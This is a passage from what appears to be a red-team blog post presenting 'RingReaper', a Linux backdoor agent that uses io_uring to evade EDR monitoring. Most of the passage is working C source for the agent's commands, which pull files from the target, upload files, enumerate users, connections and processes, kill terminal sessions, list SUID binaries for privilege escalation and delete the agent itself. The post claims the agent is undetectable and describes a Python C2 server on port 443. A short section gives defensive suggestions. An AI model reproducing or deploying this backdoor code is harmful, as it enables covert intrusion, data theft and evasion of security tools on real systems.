asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"}]